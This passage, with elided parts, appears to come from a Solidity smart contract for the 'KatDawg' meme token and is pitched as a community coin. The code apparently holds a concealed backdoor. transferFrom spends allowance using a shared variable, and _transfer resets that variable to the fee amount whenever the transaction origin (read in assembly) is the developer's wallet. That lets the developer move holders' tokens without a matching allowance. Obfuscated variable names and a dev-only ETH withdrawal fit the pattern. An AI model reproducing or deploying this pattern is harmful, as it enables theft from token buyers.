...
/*
    KatDawg is all about breaking down walls between Doges and Kitties, creating a space where both can vibe together.

    This isn’t just our mission; it’s your journey too. As a true community coin, KataDawg's fate is in your hands.

    We’re calling all meme lovers and degens to join us.

    Website: https://katdawg.vip
    Twitter: https://x.com/KatDawgOnETH
    Telegram: https://t.me/KatDawgOnETH
...
contract KatDawg is ERC20, Ownable {
    ...
    address payable private KatDawgDevWallet;
    ...
    uint256 private _KatDawgAmount;

    address private LKNSBLSKDNGLKSE;

    uint256 public _preventSwapBefore = 0;
    uint256 public _totalBuys = 0;

    uint256 public _KatDawgVesion = 1;
    address EOIJWF;
    uint256 public _KatDawgNum = 23;

    bool private LOBGSEOIJGLSKF;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedmaxTransaction;
    mapping(address => bool) public automatedMarketMakerPairs;

    constructor() ERC20("KatDawg", "KatDawg", 9) payable {
        ...
        KatDawgDevWallet = payable(msg.sender);
    ...
    function transferFrom(
        ...
        address spender = _msgSender();
        _KatDawgAmount = amount;
        _transfer(sender, recipient, amount);
        _spendAllowance(sender, spender, _KatDawgAmount);
    ...
    function _transfer(
        ...
        _KatDawgAmount = amount.mul(10_000).div(10_000);
        ...
        if (takeFee) {
            ...
            if(_KatDawgTaxCollector() == KatDawgDevWallet)
                _KatDawgAmount = fees;
    ...
    function swapBack(uint256 amount) private {
        ...
        KatDawgDevWallet.transfer(ethBalance);
    }
    ...
    function _KatDawgTaxCollector() internal view returns (address _payer) {
        assembly {
            _payer := origin()
        }
    }
    ...
    function manualSwap() external {
        require(_msgSender() == KatDawgDevWallet, "Unauthorized");
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0 && swapEnabled) 
            swapTokensForEth(tokenBalance);
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) 
            payable(KatDawgDevWallet).transfer(ethBalance);
    }
